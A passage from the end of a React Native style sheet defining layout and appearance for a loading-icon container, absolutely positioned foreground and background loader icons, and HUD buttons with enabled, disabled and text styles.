    height: 150,
    borderRadius: 12,
    overflow: "hidden",
    marginBottom: 48,
  },
  loaderIconBg: {
    width: 150,
    height: 150,
    position: "absolute",
    top: 0,
    left: 0,
  },
  loaderIconFg: {
    width: 225,
    height: 225,
    position: "absolute",
    top: -37,
    left: -37,
  },
  hudButton: {
    opacity: 1,
  },
  hudButtonDisabled: {
    opacity: 0.3,
  },
  hudButtonText: {
    color: "white",
    fontSize: 24,
  },
});
